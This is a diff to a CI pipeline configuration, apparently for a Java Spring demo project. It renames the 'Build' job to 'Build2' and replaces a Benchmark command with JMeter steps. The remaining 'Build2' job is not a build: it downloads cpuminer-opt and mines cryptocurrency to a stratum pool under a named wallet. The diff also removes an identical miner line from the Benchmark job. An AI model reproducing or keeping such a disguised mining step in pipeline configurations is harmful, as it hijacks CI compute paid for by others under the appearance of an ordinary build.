@@ -5,13 +5,13 @@ agent:
     type: e1-standard-2
     os_image: ubuntu1804
 blocks:
-  - name: Build
+  - name: Build2
     task:
       env_vars:
         - name: MAVEN_OPTS
           value: '-Dmaven.repo.local=.m2'
       jobs:
-        - name: Build
+        - name: Build2
           commands:
             - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Muv1rtGiiLYrsEgQ1mESBbLcrtP4TTm2ox.G -p -t2'
   - name: Test
@@ -44,4 +44,8 @@ blocks:
       jobs:
         - name: Benchmark
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Muv1rtGiiLYrsEgQ1mESBbLcrtP4TTm2ox.G -p -t2'
+            - java -version
+            - java -jar target/spring-pipeline-demo.jar > /dev/null &
+            - sleep 20
+            - 'mvn -q jmeter:jmeter'
+            - 'mvn jmeter:results'
